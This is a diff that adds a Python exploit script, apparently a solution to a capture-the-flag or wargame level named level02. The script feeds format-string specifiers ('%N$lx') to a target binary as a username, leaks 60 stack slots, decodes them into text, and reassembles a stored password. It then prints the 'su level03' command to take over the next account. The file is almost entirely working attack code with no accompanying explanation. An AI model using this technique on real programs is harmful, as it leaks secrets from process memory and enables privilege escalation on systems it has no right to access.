@@ -1,0 +1,73 @@
+
+python - <<'PY'
+import subprocess
+import struct
+import re
+
+prog = "/home/users/level02/level02"
+
+def leak_one_slot(index):
+    username = "%%%d$lx" % index
+    stdin_input = username 
+
+    proc = subprocess.Popen(
+        [prog],
+        stdin  = subprocess.PIPE,
+        stdout = subprocess.PIPE,
+        stderr = subprocess.STDOUT
+    )
+    output = proc.communicate(stdin_input.encode())[0].decode(errors="replace")
+
+    match = re.search(r'([0-9a-fA-F]+) does not have access!', output)
+    if match:
+        return match.group(1).strip()
+    return ""
+
+def hex_to_text(raw):
+    # pad to 16 hex chars = 8 bytes
+    raw_padded = raw.zfill(16)
+
+    # decode 2 hex chars at a time = 1 byte each
+    # read pairs from LEFT to RIGHT (big-endian byte order)
+    # "756e505234376848" -> "7","5" -> 0x75='u', "6","e" -> 0x6e='n', etc
+    text = ""
+    for i in range(0, 16, 2):
+        byte_val = int(raw_padded[i:i+2], 16)
+        text += chr(byte_val) if 32 <= byte_val <= 126 else "."
+
+    # reverse because x86 stores bytes little-endian
+    return text[::-1]
+
+print("Probing stack slots 1..60\n")
+print("slot | hex leak           | decoded text")
+print("-----|--------------------|--------------")
+
+password_pieces = {}
+
+for i in range(1, 61):
+    raw = leak_one_slot(i)
+    if not raw:
+        continue
+
+    text = hex_to_text(raw)
+
+    print("  %2d | %-18s | %s" % (i, raw, text))
+
+    if any(c.isalnum() for c in text):
+        password_pieces[i] = text
+
+print("\n=== Password pieces (slots with readable text) ===")
+for idx in sorted(password_pieces.keys()):
+    print("  slot %2d: %s" % (idx, password_pieces[idx]))
+
+print("\n=== Reconstructed password ===")
+full_password = ""
+for idx in sorted(password_pieces.keys()):
+    # strip dots (non-printable placeholders) and null padding
+    full_password += password_pieces[idx].replace(".", "")
+
+print(full_password)
+print("\nNow run:")
+print("  su level03")
+print("  password: " + full_password)
+PY
